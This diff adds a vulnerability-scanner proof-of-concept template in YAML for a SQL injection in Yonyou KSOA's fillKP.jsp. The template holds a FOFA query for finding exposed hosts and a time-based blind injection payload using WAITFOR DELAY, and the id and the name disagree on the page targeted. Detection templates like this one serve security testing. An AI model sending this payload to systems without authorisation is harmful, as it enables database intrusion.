@@ -1,0 +1,28 @@
+id: poc-yaml-yongyou-ksoa-printzp-jsp-sqli
+info:
+  name: 用友时空KSOA fillKP.jsp SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 用友时空KSOA
+  fofa: app="用友-时空KSOA"
+variables:
+  t1: random_int(1,5)
+  t2: t1 + t1 + 1
+  t3: gbk_encode("填写问卷")
+  t4: gbk_encode("考核等级")
+requests:
+- method: GET
+  path: /kp/fillKP.jsp?kp_djbh=1%27+IF(LEN(db_name())>4)+WAITFOR%20DELAY%20%270:0:{{.t1}}%27+--+
+  expression: 'status_code == 200 &&
+
+    contains(body,t3) &&
+
+    contains(body,t4) &&
+
+    duration > t1 &&
+
+    duration < t2
+
+    '
+transport: http
